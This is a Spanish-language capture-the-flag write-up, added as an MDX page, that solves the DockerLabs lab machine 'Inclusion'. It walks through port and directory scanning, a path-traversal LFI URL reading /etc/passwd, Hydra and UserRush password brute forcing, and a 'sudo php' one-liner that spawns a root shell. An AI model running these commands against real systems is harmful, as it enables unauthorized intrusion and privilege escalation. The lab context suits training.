@@ -1,0 +1,201 @@
+---
+title: Inclusion
+description: Resolución completa de la máquina virtual *Inclusion* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Inclusion**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un endpoint `/shop` vulnerable a **Local File Inclusion (LFI)**, permitiendo leer archivos del sistema como `/etc/passwd`. Esta lectura revela usuarios del sistema, y mediante un ataque de fuerza bruta con Hydra se obtiene acceso SSH como `manchi`.
+Una vez dentro, se utiliza `UserRush` para fuerza bruta local y obtener acceso al usuario `seller`. Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `php` como root, facilitando una escalada directa de privilegios hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Inclusion',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '12/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Inclusion.zip
+sudo bash auto_deploy.sh Inclusion.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Inclusion/{content,exploits,nmap,scripts}
+cd Inclusion
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764188540/Ports_h4ssoz.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764188539/Feroxbuster_hyshzd.png)
+
+**Rutas relevantes:**
+- `/index.html` — Página por defecto de Apache.
+- `/shop` — Tienda con un parámetro vulnerable.
+
+![Shop](https://res.cloudinary.com/dewqswzke/image/upload/v1764188541/Shop_hxqjg8.png)
+
+El mensaje `"Error de Sistema: ($_GET['archivo']);"` sugiere una vulnerabilidad **LFI**.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 LFI para lectura de archivos
+
+Se prueba la vulnerabilidad:
+
+```
+http://172.17.0.2/shop/index.php?archivo=../../../../etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1764188540/Passwd_fchwsm.png)
+
+Usuarios identificados: `manchi` y `seller`.
+
+### 2.2 Fuerza bruta SSH
+
+```bash
+hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1764188540/Hydra_sczolg.png)
+
+```bash
+ssh manchi@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1764188541/SSH_i9quap.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De manchi → seller
+
+Se utiliza `UserRush` para fuerza bruta local:
+
+```bash
+scp ./UserRush.sh manchi@172.17.0.2:/tmp/UserRush.sh
+scp /usr/share/wordlists/rockyou.txt manchi@172.17.0.2:/tmp/rockyou.txt
+chmod +x /tmp/UserRush.sh
+./UserRush.sh -u seller -t 20
+```
+
+![UserRush](https://res.cloudinary.com/dewqswzke/image/upload/v1764188542/UserRush_th9cal.png)
+
+```bash
+su seller
+```
+
+![Seller](https://res.cloudinary.com/dewqswzke/image/upload/v1764188540/Seller_fnn4ra.png)
+
+### 3.2 De seller → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l seller](https://res.cloudinary.com/dewqswzke/image/upload/v1764188541/Sudo-lSeller_pdwqas.png)
+
+Se puede ejecutar `php` como root:
+
+```bash
+sudo php -r "system('/bin/bash');"
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764188540/Root_ptlsfw.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Local File Inclusion (LFI) no validado",
+      severity: "Alta",
+      impact: "Lectura de archivos sensibles del sistema"
+    },
+    {
+      vulnerability: "Contraseñas débiles en usuarios del sistema",
+      severity: "Crítica",
+      impact: "Acceso SSH mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en php",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
